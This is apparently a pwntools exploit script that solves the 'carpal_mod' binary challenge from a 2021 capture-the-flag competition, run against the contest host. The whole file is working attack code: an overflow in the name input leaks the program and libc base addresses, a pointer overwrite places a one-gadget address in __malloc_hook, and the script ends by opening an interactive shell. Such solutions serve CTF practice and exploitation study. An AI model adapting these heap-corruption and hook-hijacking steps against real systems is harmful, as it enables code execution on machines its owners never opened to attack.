#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn.2021.chall.actf.co', 21840
binary = './carpal_mod'
brkpts = '''
'''

elf = ELF("carpal_mod")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def choice(idx):
    sla("Choice: ", str(idx))

def mark(x, y):
    choice(1)
    sla(": ", str(x)+" "+str(y))

def view(x, y):
    choice(2)
    sla(": ", str(x)+" "+str(y))

def checkbingo(len, data, val = False):
    choice(5)
    sla("(y/n)? ", "y" if val else "n")
    sla("name: ", str(len))
    sa("Name: ", data)

def reset(idx, rc = 'c'):
    choice(3)
    sla(": ", str(idx))
    sla(": ", str(rc))

def newmarker(data):
    choice(6)
    sa(": ", data)


if __name__ == "__main__":
    sla(": ", "abcd")
    for i in range(5):
        mark(4, i)
    payload = "a"*0x18+"\x20"
    checkbingo(0x27, payload, True)
    reu("Once again, congratulations, aaaaaaaaaaaaaaaaaaaaaaaa")
    code = uu64(re(6)) - 0x3220
    log.info("code base -> "+hex(code))

    reset(4)

    for i in range(5):
        mark(4, i)
    
    payload = "a"*0x18 + p64(code + 0x4f70)
    checkbingo(0x27, payload, True)

    view(4, 4)
    reu("(4, 4): ")
    libc.address = uu64(re(6)) - libc.symbols['free']

    log.info("libc -> "+hex(libc.address))

    malloc_hook = libc.symbols['__malloc_hook']
    gadget = libc.address + 0xe6c81
    
    newmarker(p64(malloc_hook))
    mark(4, 1)
    reset(4)

    newmarker(p64(gadget))
    mark(4, 3)
    reset(4)

    io.interactive()
